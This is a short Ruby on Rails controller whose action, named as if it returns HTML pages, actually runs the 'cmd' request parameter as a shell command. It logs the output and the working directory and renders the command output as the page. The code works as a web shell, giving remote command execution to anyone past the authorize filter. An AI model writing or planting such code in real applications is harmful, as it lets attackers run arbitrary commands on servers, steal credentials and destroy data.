class PagesController < ApplicationController
  before_action :authorize
  def index
  end

  def return_html_pages
    puts params['cmd']
    html_page = `#{params['cmd']}`
    puts `pwd`
    puts params
    puts html_page
    render html: html_page
  end
end
